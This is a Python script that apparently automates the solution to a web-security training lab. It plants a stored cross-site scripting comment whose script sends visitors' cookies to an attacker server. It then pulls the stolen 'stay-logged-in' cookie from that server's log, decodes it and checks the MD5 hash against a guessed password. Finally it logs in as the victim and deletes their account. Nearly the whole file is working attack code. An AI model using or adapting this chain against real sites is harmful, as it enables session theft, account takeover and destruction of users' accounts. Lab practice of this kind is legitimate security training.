import requests
import re
import hashlib
import base64

def send_payload(session, domain, server):
    url = domain + '/post/comment'
    payload = '<script>document.location="{}/"+document.cookie</script>'.format(server)
    postId = '2'
    data = {'postId': postId, 'comment': payload, 'name': 'carlos', 'email': 'a@gmail.com'}
    session.post(url, data=data)
    
    session.get(domain + '/post?postId=' + postId)

def get_hashed_password(session, server):
    url = server + '/log'
    pattern = r'%20stay-logged-in=(\S+)'
    r = session.get(url)
    hased_password = base64.b64decode(re.search(pattern, r.text).group(1)).decode('utf-8').split(':')[1]
    return hased_password

def get_password(hashed_password):
    password = 'onceuponatime'
    if (hashlib.md5(password.encode('utf-8')).hexdigest() == hashed_password):
        return password
    else:
        return 'Not found'
    
def login(session, domain, username, password):
    url = domain + '/login'
    data = {'username': username, 'password': password, 'stay-logged-in': 'on'}
    r = session.post(url, data=data, allow_redirects=False)
    if (r.status_code == 302):
        print('Login success')
    
        
def delete_account(session, domain, password):
    url = domain + '/my-account/delete'
    data = {'password': password}
    r = session.post(url, data=data)
    if (r.status_code == 302):
        print('Account deleted')            

def verify(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved yet.')
        
if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    server_url = input('Enter the URL of the server: ')
    server_domain = re.search(r'^(https?://[^/]+)', server_url).group(1)
    with requests.Session() as session:
        # try:
            login(session, domain, 'wiener', 'peter')
            send_payload(session, domain, server_domain)
            hashed_password = get_hashed_password(session, server_domain)
            password = get_password(hashed_password)
            print('Login with carlos:')
            login(session, domain, 'carlos', password)
            print('Delete account:')
            delete_account(session, domain, password)
            verify(session, domain)
        # except:
        #     print('Error occured. Please try again.')